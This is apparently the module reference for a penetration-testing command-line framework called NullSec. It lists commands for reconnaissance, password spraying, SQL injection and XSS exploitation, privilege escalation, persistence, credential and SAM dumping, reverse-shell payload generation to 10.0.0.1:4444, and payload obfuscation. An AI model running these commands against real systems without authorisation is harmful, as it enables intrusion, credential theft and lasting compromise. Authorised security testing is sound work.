# NullSec Framework Modules

Complete module reference for the NullSec security framework.

## Reconnaissance

### Network Discovery
```bash
nullsec recon network --target 192.168.1.0/24
nullsec recon hosts --target 192.168.1.0/24 --ports 22,80,443
nullsec recon services --target 192.168.1.100
```

### Web Reconnaissance
```bash
nullsec recon web --url https://target.com
nullsec recon dns --domain target.com
nullsec recon whois --domain target.com
```

### OSINT
```bash
nullsec recon osint --email user@target.com
nullsec recon social --username targetuser
nullsec recon breach --email user@target.com
```

## Scanning

### Vulnerability Scanning
```bash
nullsec scan vuln --target 192.168.1.100
nullsec scan web --url https://target.com
nullsec scan ssl --host target.com
```

### Port Scanning
```bash
nullsec scan ports --target 192.168.1.100 --type full
nullsec scan ports --target 192.168.1.0/24 --type quick
nullsec scan udp --target 192.168.1.100
```

## Exploitation

### Credential Testing
```bash
nullsec exploit creds --service ssh --target 192.168.1.100
nullsec exploit spray --users users.txt --password Winter2025!
nullsec exploit kerberos --domain corp.local
```

### Web Exploitation
```bash
nullsec exploit sqli --url "https://target.com/search?q="
nullsec exploit xss --url https://target.com --crawl
nullsec exploit upload --url https://target.com/upload
```

## Post-Exploitation

### Privilege Escalation
```bash
nullsec post privesc --os linux
nullsec post privesc --os windows
nullsec post sudo --check
```

### Persistence
```bash
nullsec post persist --method cron
nullsec post persist --method service
nullsec post persist --method registry
```

### Data Collection
```bash
nullsec post harvest --type credentials
nullsec post harvest --type files --pattern "*.conf"
nullsec post dump --type sam
```

## Utilities

### Encoding/Decoding
```bash
nullsec util encode --base64 "payload"
nullsec util decode --base64 "cGF5bG9hZA=="
nullsec util hash --md5 "password"
```

### Payload Generation
```bash
nullsec util payload --type reverse --host 10.0.0.1 --port 4444
nullsec util payload --type bind --port 4444
nullsec util obfuscate --input payload.ps1
```

### Network Utilities
```bash
nullsec util proxy --port 8080
nullsec util tunnel --local 8080 --remote target.com:80
nullsec util dns --server 8.8.8.8
```

## Module Development

### Module Structure
```python
from nullsec.module import BaseModule

class CustomModule(BaseModule):
    name = "custom_module"
    description = "Custom security module"
    author = "your_name"
    
    def run(self, target, **options):
        # Module implementation
        pass
```

### Registration
```bash
nullsec module install ./custom_module.py
nullsec module list --custom
nullsec module info custom_module
```

## Configuration

### Global Settings
```bash
nullsec config set output.format json
nullsec config set proxy.enabled true
nullsec config set threads 10
```

### Profiles
```bash
nullsec profile create pentest
nullsec profile use pentest
nullsec profile export pentest > config.yml
```

---

For detailed module documentation, run:
```bash
nullsec help <module>
```
